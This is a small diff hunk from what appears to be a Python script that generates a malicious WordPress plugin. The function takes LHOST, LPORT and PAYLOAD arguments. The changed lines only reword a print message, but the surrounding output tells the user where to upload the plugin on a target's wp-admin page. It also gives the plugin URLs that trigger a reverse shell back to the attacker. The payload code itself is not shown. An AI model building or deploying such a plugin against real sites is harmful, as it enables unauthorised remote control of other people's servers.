@@ -80,7 +80,7 @@ def generate_plugin(LHOST, LPORT, PAYLOAD):
 	print "[+] Cleaning up files"
 	os.system("rm QwertyRocks.php wetw0rk_maybe.php")
 	# Useful Info
-	print "[+] General Upload Location: http://(target)/wp-admin/plugin-install.php?tab=upload"
+	print "[+] URL to upload the plugin: http://(target)/wp-admin/plugin-install.php?tab=upload"
 	print "[+] How to trigger the reverse shell : "
 	print "      ->   http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php"
 	print "      ->   http://(target)/wp-content/plugins/malicious/QwertyRocks.php"
